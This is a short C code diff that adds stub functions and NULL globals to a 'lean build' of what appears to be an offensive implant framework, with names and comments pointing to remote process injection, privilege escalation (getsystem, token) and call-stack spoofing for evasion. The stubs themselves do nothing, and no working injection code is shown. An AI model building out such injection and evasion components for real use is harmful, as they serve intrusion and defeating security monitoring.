@@ -1,5 +1,14 @@
 #include "inject.h"
 
+/* Lean-build stubs — inject capability excluded via -DLEAN.
+ * inject_nt_open_process is still called by getsystem/spawn/token;
+ * returning NULL causes those callers to fail gracefully. */
+
+/* Spoof-call globals referenced by spoof_stub.S — NULL in stub build */
+void *inj_sc_gadget = NULL;
+void *inj_frame1    = NULL;
+void *inj_frame2    = NULL;
+
 DWORD  inject_find_target(void)                                              { return 0; }
 HANDLE inject_nt_open_process(DWORD pid, DWORD access)                       { (void)pid; (void)access; return NULL; }
 int    inject_remote(DWORD pid, const BYTE *sc, SIZE_T n)                    { (void)pid; (void)sc; (void)n; return -1; }
